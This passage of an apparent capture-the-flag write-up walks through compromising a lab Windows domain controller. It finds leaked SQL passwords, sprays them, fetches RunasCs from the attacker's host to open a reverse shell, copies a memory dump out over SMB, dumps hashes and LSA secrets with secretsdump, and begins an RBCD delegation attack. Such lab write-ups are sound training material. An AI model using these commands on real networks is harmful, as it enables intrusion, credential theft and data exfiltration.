              MICROSOFT.SQLSERVER.CONFIGURATION.INSTALLWIZARDFRAMEWORK.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.ISMASTEREXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.ISTELEMETRYCONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.ISWORKEREXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.MANAGEMENTTOOLSEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.MSIEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.MSIEXTENSION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.POLYBASECONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.POLYBASEJAVACONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.POWERSHELLEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.REPL_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.RSEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.RULESENGINEEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.RULESENGINEEXTENSION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SAA_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SCO.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SCO.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SCOEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SETUPEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SETUPEXTENSION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SLPEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SMARTSETUPEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SMARTSETUPEXTENSION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SMPY_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SMR_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SNISERVERCONFIGEXT.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SQLBROWSEREXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SQLCONFIGBASE.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SQLCONFIGBASE.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SQLSERVER_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.SSISEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.TELEMETRYCONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.UIEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.UIEXTENSION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.UTILITYEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.WIZARDFRAMEWORK.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.WIZARDFRAMEWORK.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.WMIINTEROP.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.XTP.CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONNECTIONINFO.DLL
              MICROSOFT.SQLSERVER.CUSTOMCONTROLS.DLL
              MICROSOFT.SQLSERVER.DATAWAREHOUSE.WORKLOADDEPLOYMENT.DLL
              MICROSOFT.SQLSERVER.DEPLOYMENT.DLL
              MICROSOFT.SQLSERVER.DEPLOYMENT.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.DIAGNOSTICS.STRACE.DLL
              MICROSOFT.SQLSERVER.DISCOVERY.DLL
              MICROSOFT.SQLSERVER.DISCOVERY.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.DMF.COMMON.DLL
              MICROSOFT.SQLSERVER.DMF.DLL
              MICROSOFT.SQLSERVER.INSTAPI.DLL
              MICROSOFT.SQLSERVER.INTEROP.FIREWALLAPI.DLL
              MICROSOFT.SQLSERVER.INTEROP.TASKSCHD.DLL
              MICROSOFT.SQLSERVER.INTEROP.WUAPILIB.DLL
              MICROSOFT.SQLSERVER.MANAGEMENT.CONTROLS.DLL
              MICROSOFT.SQLSERVER.MANAGEMENT.SDK.SFC.DLL
              MICROSOFT.SQLSERVER.SETUP.CHAINER.WORKFLOW.DLL
              MICROSOFT.SQLSERVER.SETUP.CHAINER.WORKFLOW.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.SMO.DLL
              MICROSOFT.SQLSERVER.SQLCLRPROVIDER.DLL
              MICROSOFT.SQLSERVER.SQLENUM.DLL
              MICROSOFT.SQLSERVER.SSTRING.DLL
              MICROSOFT.SQLSERVER.USAGETRACKING.DLL
              MSVCP140.DLL
              MSVCP140_1.DLL
              NEWTONSOFT.JSON.DLL
              PACKAGE.XSD
              PIDGENX.DLL
              PIDPRIVATECONFIGOBJECTMAPS.XML
              PREPARECLUSTERWIZARD.XML
              PREPAREIMAGEWIZARD.XML
              REMOVENODE.XML
              REPAIRWIZARD.XML
              RSETUP.EXE
              RUNRULESUI.XML
              SCENARIOENGINE.EXE
              SCENARIOENGINE.EXE.CONFIG
              SHELLOBJECTS.DLL
              SQLBOOT.DLL
              SQLCAB.DLL
              SQLCONF.DLL
              SQLMU.DLL
              SQLPROCESSSUB.DLL
              SQLSCCN.DLL
              UNINSTALLWIZARD.XML
              UPGRADEWIZARD.XML
              VCCORLIB140.DLL
              VCRUNTIME140.DLL

           Setup
                   CONN_INFO.MSI
                   RSFX.MSI
                   SMO.MSI
                   SMO_EXTENSIONS.MSI
                   SQL_BATCHPARSER.MSI
                   SQL_COMMON_CORE.MSI
                   SQL_DIAG.MSI
                   SQL_DMF.MSI
                   SQL_ENGINE_CORE_INST.MSI
                   SQL_ENGINE_CORE_SHARED.MSI
                   SQL_XEVENT.MSI

Favorites
Links
Music
Pictures
Saved Games
Searches
Videos

```

The top level directory contains installers, as well as a configuration file:

```

PS C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU> ls

    Directory: C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/27/2024   1:52 PM                1033_ENU_LP
d-----        5/27/2024   1:52 PM                redist
d-----        5/27/2024   1:52 PM                resources
d-----        5/27/2024   1:52 PM                x64
-a----        9/24/2019   9:00 PM             45 AUTORUN.INF
-a----        9/24/2019   9:00 PM            784 MEDIAINFO.XML
-a----        9/29/2023   4:49 AM             16 PackageId.dat
-a----        9/24/2019   9:00 PM         142944 SETUP.EXE
-a----        9/24/2019   9:00 PM            486 SETUP.EXE.CONFIG
-a----        5/27/2024   4:58 PM            724 sql-Configuration.INI
-a----        9/24/2019   9:00 PM         249448 SQLSETUPBOOTSTRAPPER.DLL

```

The configuration file defines how the MSSQL instance runs:

```

PS C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True

```

“IL0v3ErenY3ager” and “t3mp0r@ryS@PWD” are two passwords leaked.

### Password Spray

I’ll create a file with all the users on the box, and another with these two passwords, and use `netexec` to check each of them over SMB:

```

oxdf@hacky$ netexec smb freelancer.htb -u users -p passwords --continue-on-success
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\MSSQLSERVER:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sqlbackupoperator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sql_svc:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\administrator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\MSSQLSERVER:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sqlbackupoperator:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sql_svc:t3mp0r@ryS@PWD STATUS_LOGON_FAILURE

```

There’s a match on mikasaAckerman!

Unfortunately, no hits on WinRM:

```

oxdf@hacky$ netexec winrm freelancer.htb -u users -p passwords --continue-on-success
WINRM       10.10.11.5      5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb)
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\administrator:IL0v3ErenY3ager
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\MSSQLSERVER:IL0v3ErenY3ager
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sqlbackupoperator:IL0v3ErenY3ager
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sql_svc:IL0v3ErenY3ager
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\administrator:t3mp0r@ryS@PWD
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\lkazanof:t3mp0r@ryS@PWD
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\lorra199:t3mp0r@ryS@PWD
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\mikasaAckerman:t3mp0r@ryS@PWD
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\MSSQLSERVER:t3mp0r@ryS@PWD
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sqlbackupoperator:t3mp0r@ryS@PWD
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sql_svc:t3mp0r@ryS@PWD

```

### RunasCs

I’ll grab a copy of [RunasCs](https://github.com/antonioCoco/RunasCs) from GitHub and host it on a Python webserver. I’ll fetch it with PowerShell:

```

PS C:\programdata> curl 10.10.14.6/RunasCs.exe -outfile RunasCs.exe

```

Now I’ll run it to get a reverse shell:

```

PS C:\programdata> .\RunasCs.exe mikasaAckerman "IL0v3ErenY3ager" -d freelancer.htb cmd -r 10.10.14.6:444

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-43538$\Default
[+] Async process 'C:\WINDOWS\system32\cmd.exe' with pid 524 created in background.

```

At `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.5 61910
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>

```

I’ll upgrade to PowerShell:

```

C:\WINDOWS\system32> powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\WINDOWS\system32>

```

And grab the flag:

```

PS C:\Users\mikasaAckerman\desktop> cat user.txt
4b621f61************************

```

## Shell as lorra199

### Enumeration

On mikasaAckerman’s desktop there’s two additional files beyond the flag:

```

PS C:\Users\mikasaAckerman\desktop> ls

    Directory: C:\Users\mikasaAckerman\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/28/2023   6:23 PM           1468 mail.txt
-a----        10/4/2023   1:47 PM      292692678 MEMORY.7z
-a----       10/19/2023   7:43 PM             66 user.txt

```

`mail.txt` has a note:

> Hello Mikasa,
> I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the “DATACENTER-2019” computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
> I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server’s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
> Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
> Best regards,

There’s a full memory dump of the system!

I’ll exfil it by first creating an SMB share on my host:

```

oxdf@hacky$ smbserver.py share . -username oxdf -password oxdf -smb2support
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

On Freelancer, I’ll mount the share:

```

PS C:\Users\mikasaAckerman\desktop> net use \\10.10.14.6\share /u:oxdf oxdf
The command completed successfully.

```

Now I’ll copy the dump onto it:

```

PS C:\Users\mikasaAckerman\desktop> copy MEMORY.7z \\10.10.14.6\share\

```

And make sure the hashes match:

```

PS C:\Users\mikasaAckerman\desktop> get-filehash -algorithm md5 MEMORY.7z

Algorithm       Hash                                                                   Path                            
---------       ----                                                                   ----                            
MD5             931386993AB32B37692FDE69E8FF389F       C:\Users\mikasaAckerman\deskt...

```

They do:

```

oxdf@hacky$ md5sum MEMORY.7z 
931386993ab32b37692fde69e8ff389f  MEMORY.7z

```

### Dump Analysis

I fought a vigorous and brave fight with Volatility, and lost on this one. I also learned a good deal about evaluating crash dumps with WinDbg from [DebugPrivilege](https://x.com/DebugPrivilege) (there’s even a Mimikatz plugin that will dump creds that leads to an unintended solution I’ll show in [Beyond Root](#alternative-paths-to-administrator)).

But what ended up getting me down the intended path is [MemProcFS](https://github.com/ufrisk/MemProcFS). I’ll download the latest release, and use it to mount the memory as a directory:

```

oxdf@hacky$ sudo /opt/MemProcFS/memprocfs -device MEMORY.DMP -mount /mnt
Initialized 64-bit Windows 10.0.17763

==============================  MemProcFS  ==============================
 - Author:           Ulf Frisk - pcileech@frizk.net                      
 - Info:             https://github.com/ufrisk/MemProcFS                 
 - Discord:          https://discord.gg/pcileech                         
 - License:          GNU Affero General Public License v3.0              
   --------------------------------------------------------------------- 
   MemProcFS is free open source software. If you find it useful please  
   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)  
   --------------------------------------------------------------------- 
 - Version:          5.9.17 (Linux)
 - Mount Point:      /mnt           
 - Tag:              17763_a3431de6        
 - Operating System: Windows 10.0.17763 (X64)
==========================================================================

```

This just hangs, but in another terminal:

```

root@hacky[/mnt]# ls
conf  forensic  memory.dmp  memory.pmem  misc  name  pid  py  registry  sys

```

In the `registry` directory are directories and files representing the parts of registry hives that it’s able to pull out:

```

root@hacky[/mnt/registry]# ls
by-hive  hive_files  hive_memory  HKLM  HKU

```

`HKLM` and `HKU` are filesystem representations of the keys. For example, to see where [LSA Secrets](https://attack.mitre.org/techniques/T1003/004/) are stored:

```

root@hacky[/mnt/registry]# ls HKLM/SECURITY/Policy/Secrets/
'$MACHINE.ACC'  '(Default)'   DefaultPassword  '(Default).txt'   DPAPI_SYSTEM  '(_Key_)'  '(_Key_).txt'  'NL$KM'  '_SC_MSSQL$DATA'  '_SC_SQLTELEMETRY$DATA'
root@hacky[/mnt/registry]# cat HKLM/SECURITY/Policy/Secrets/_SC_MSSQL\$DATA/CurrVal/\(_Key_\) | xxd
00000000: a8ff ffff 6e6b 2000 ffb7 dd9c bdf6 d901  ....nk .........
00000010: 0100 0000 984f 0000 0000 0000 0000 0000  .....O..........
00000020: ffff ffff ffff ffff 0100 0000 f84f 0000  .............O..
00000030: 6801 0000 ffff ffff 0000 0000 0000 0000  h...............
00000040: 0000 0000 7c00 0000 0000 0000 0700 0000  ....|...........
00000050: 4375 7272 5661 6c00                      CurrVal.

```

`hive_files` has files that represent what can be recovered from of the hive files:

```

root@hacky[/mnt/registry]# ls hive_files/
0xffffd30679c0e000-unknown-unknown.reghive                                              0xffffd3067db43000-BBI-A_{ae450ff4-3002-4d4d-921c-fd354d63ec8b}.reghive
0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive                                        0xffffd3067db53000-NTUSERDAT-USER_S-1-5-19.reghive
0xffffd30679cdc000-unknown-MACHINE_HARDWARE.reghive                                     0xffffd3067dd5e000-ActivationStoredat-A_{D65833F6-A688-4A68-A28F-F59183BDFADA}.reghive
0xffffd3067b257000-settingsdat-A_{c94cb844-4804-8507-e708-439a8873b610}.reghive         0xffffd3067e30e000-UsrClassdat-USER_S-1-5-21-3542429192-2036945976-3483670807-1121_Classes.reghive
0xffffd3067b261000-ActivationStoredat-A_{23F7AFEB-1A41-4BD7-9168-EA663F1D9A7D}.reghive  0xffffd3067ec26000-Amcachehve-A_{da3518a3-bbc6-1dba-206b-2755382f1364}.reghive
0xffffd3067b514000-BCD-MACHINE_BCD00000000.reghive                                      0xffffd3067ec39000-ntuserdat-USER_S-1-5-21-3542429192-2036945976-3483670807-1121.reghive
0xffffd3067b516000-SOFTWARE-MACHINE_SOFTWARE.reghive                                    0xffffd3067ec58000-settingsdat-A_{8a28242f-95cc-f96a-239c-d8a872afe4cc}.reghive
0xffffd3067d7e9000-DEFAULT-USER_.DEFAULT.reghive                                        0xffffd3067f097000-DRIVERS-MACHINE_DRIVERS.reghive
0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive                                    0xffffd3067f91b000-UsrClassdat-USER_S-1-5-21-3542429192-2036945976-3483670807-500_Classes.reghive
0xffffd3067d935000-SAM-MACHINE_SAM.reghive                                              0xffffd3067f9e7000-ntuserdat-USER_S-1-5-21-3542429192-2036945976-3483670807-500.reghive
0xffffd3067d9c4000-NTUSERDAT-USER_S-1-5-20.reghive

```

This is enough to `secretsdump.py`:

```

root@hacky[/mnt/registry/hive_files]# secretsdump.py -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive local
Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra

[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
[*] Dumping cached domain logon information (domain/username:hash)
FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc
dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53
[*] NL$KM 
 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u
 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.
 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &.........z.I.C.
 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.'I...c 
NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320
[*] _SC_MSSQL$DATA 
(Unknown User):PWN3D#l0rr@Armessa199
[*] Cleaning up...

```

The administrator hash doesn’t work on Freelancer. But there is a plaintext password for the MSSQL service account, “PWN3D#l0rr@Armessa199”. There’s also a hash in here that will come into play when I show the [intended path](#intended-path) in Beyond Root.

### Password Spray

The “PWN3D#l0rr@Amressa199” password works for lorra199 for both SMB and WinrM:

```

oxdf@hacky$ netexec smb freelancer.htb -u users -p passwords2 --continue-on-success
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\administrator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\mikasaAckerman:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\MSSQLSERVER:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sqlbackupoperator:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sql_svc:PWN3D#l0rr@Armessa199 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\administrator:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\mikasaAckerman:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\MSSQLSERVER:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sqlbackupoperator:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\sql_svc:MSSQLS3rv3rP@sswd#09 STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec winrm freelancer.htb -u users -p passwords2 --continue-on-success
WINRM       10.10.11.5      5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:freelancer.htb)
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\administrator:PWN3D#l0rr@Armessa199
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\lkazanof:PWN3D#l0rr@Armessa199
WINRM       10.10.11.5      5985   DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199 (Pwn3d!)
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\mikasaAckerman:PWN3D#l0rr@Armessa199
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\MSSQLSERVER:PWN3D#l0rr@Armessa199
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sqlbackupoperator:PWN3D#l0rr@Armessa199
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sql_svc:PWN3D#l0rr@Armessa199
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\administrator:MSSQLS3rv3rP@sswd#09
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\lkazanof:MSSQLS3rv3rP@sswd#09
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\mikasaAckerman:MSSQLS3rv3rP@sswd#09
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\MSSQLSERVER:MSSQLS3rv3rP@sswd#09
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sqlbackupoperator:MSSQLS3rv3rP@sswd#09
WINRM       10.10.11.5      5985   DC               [-] freelancer.htb\sql_svc:MSSQLS3rv3rP@sswd#09

```

### Shell

With the creds and permissions for WinRM, I’ll get a shell:

```

oxdf@hacky$ evil-winrm -i freelancer.htb -u lorra199 -p 'PWN3D#l0rr@Armessa199'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\lorra199\Documents>

```

## Shell as Administrator

### Enumeration

I’ll collect Bloodhound data to get a better view of the domain:

```

oxdf@hacky$ bloodhound-python -d freelancer.htb -c all -u lorra199 -p 'PWN3D#l0rr@Armessa199' -ns 10.10.11.5 --zip
INFO: Found AD domain: freelancer.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 8 computers
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 30 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SetupMachine.freelancer.htb
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: Datacenter-2019
INFO: Querying computer: DC.freelancer.htb
WARNING: Could not resolve: Datacenter-2019: All nameservers failed to answer the query Datacenter-2019. IN A: Server 10.10.11.5 UDP port 53 answered SERVFAIL
INFO: Done in 00M 21S
INFO: Compressing output into 20240608032642_bloodhound.zip

```

I gave the [Docker version of BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose) a try here. It is still lacking some features, but I’ve been burned by it since, so I’m not sure I can recommend it yet.

Working from lorra199, they have *tons* of outbound control:

![image-20240608070117775](/img/image-20240608070117775.png)

The most interesting as an attacker is:

![image-20240608070711091](/img/image-20240608070711091.png)

As a member of the AD Recycle Bin group, Lorra199 has `GenericWrite` over the DC. This is the same path I showed on [Support](/2022/12/17/htb-support.html#shell-as-domainadmin).

### Exploit via RBCD

#### Background

One way to abuse `GenericWrite` on a computer object is to create a fake computer on the domain and then write onto the DC that the fake computer has the ability to delegate as the DC (with resource-based constrained delegation (RBCD)). Then I can request a ticket as the DC and act as the DC.

Bloodhound shows this if I click on the `GenericWrite` under “Linux Abuse”:

![image-20240608071229267](/img/image-20240608071229267.png)

#### Add Computer

I’ll add a computer using `addcomputer.py` from [Impacket](https://github.com/SecureAuthCorp/impacket). When I run it with the options given in the help above, it fails:

```

oxdf@hacky$ addcomputer.py -method LDAPS -computer-name '0xdf$' -computer-pass '0xdf0xdf123!' -dc-host 10.10.11.5 -domain-netbios freelancer.htb 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra
[-] socket ssl wrapping error: [Errno 104] Connection reset by peer

```

